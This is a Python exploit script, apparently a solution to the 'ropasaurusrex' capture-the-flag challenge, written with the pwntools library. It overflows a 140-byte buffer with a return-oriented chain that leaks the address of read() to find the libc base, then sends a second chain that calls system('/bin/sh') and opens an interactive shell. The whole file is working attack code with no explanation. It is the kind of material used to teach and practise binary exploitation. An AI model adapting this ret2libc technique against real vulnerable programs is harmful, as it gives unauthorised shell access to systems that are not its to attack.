#!/usr/bin/python
from pwn import *
context.arch = "i386"

p = process("./ropasaurusrex")
e = ELF("./ropasaurusrex")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
MAIN_ADDRESS = 0x804841d

# leak read() address and return to main()
rop = ROP(e)
rop.write(constants.STDOUT_FILENO, e.got["read"], 4)
rop.raw(MAIN_ADDRESS)
p.sendline("A" * 140 + str(rop))

read_addr = u32(p.read(4))
libc.address = read_addr - libc.symbols["read"]
bin_sh_address = libc.search("/bin/sh").next()
log.info("leaked read() address: 0x{:>8x}".format(read_addr))
log.info("found system() address: 0x{:>8x}".format(libc.symbols["system"]))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

# call system("/bin/sh")
rop = ROP(libc)
rop.system(bin_sh_address)
p.sendline("A" * 140 + str(rop))
p.interactive()
